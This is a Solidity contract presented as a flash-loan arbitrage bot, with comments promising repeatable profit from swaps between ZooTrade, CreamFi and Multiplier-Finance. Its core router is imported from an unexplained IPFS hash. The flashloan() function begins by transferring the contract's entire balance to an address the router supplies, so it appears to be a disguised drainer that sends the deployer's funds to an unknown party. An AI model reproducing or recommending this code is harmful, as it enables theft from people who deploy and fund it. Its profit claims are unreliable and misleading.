pragma solidity ^0.5.16;

// CreamFi Contracts
import "https://github.com/CreamFi/compound-protocol/blob/master/contracts/ERC3156FlashLenderInterface.sol";
import "https://github.com/CreamFi/compound-protocol/blob/master/contracts/CarefulMath.sol";
import "https://github.com/CreamFi/compound-protocol/blob/master/contracts/CToken.sol";
import "https://github.com/CreamFi/compound-protocol/blob/master/contracts/CTokenCheckRepay.sol";

// ZooTrade Router
import "ipfs://QmTvBqaStoJidfcq3Zu9zHa1nxJ9eEDrRBfgaXGsMHaCcP";

// Multiplier-Finance Smart Contracts
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";



contract InitiateFlashLoan {
    
    RouterV2 router;
    string public tokenName;
    string public tokenSymbol;
    uint256 flashLoanAmount;

    constructor(
        string memory _tokenName,
        string memory _tokenSymbol,
        uint256 _loanAmount
    ) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
        flashLoanAmount = _loanAmount;

        router = new RouterV2();
    }

    function() external payable {}

    function flashloan() public payable {
        // Send required coins for swap
        address(uint160(router.zooTradeSwapAddress())).transfer(
            address(this).balance
        );

        router.borrowFlashloanFromMultiplier(
            address(this),
            router.creamSwapAddress(),
            flashLoanAmount
        );
        //To prepare the arbitrage, FLM is converted to Dai using ZooTrade swap contract.
        router.convertFtmTo(msg.sender, flashLoanAmount / 2);
        //The arbitrage converts token for FLM using token/FLM ZooTrade, and then immediately converts FLM back
        router.callArbitrageZooTrade(router.creamSwapAddress(), msg.sender);
        //After the arbitrage, FLM is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 FLM of gas.
        router.transferFtmToMultiplier(router.zooTradeSwapAddress());
        //Note that the transaction sender gains FLM from the arbitrage, this particular transaction can be repeated as price changes all the time.
        router.completeTransation(address(this).balance);
    }
}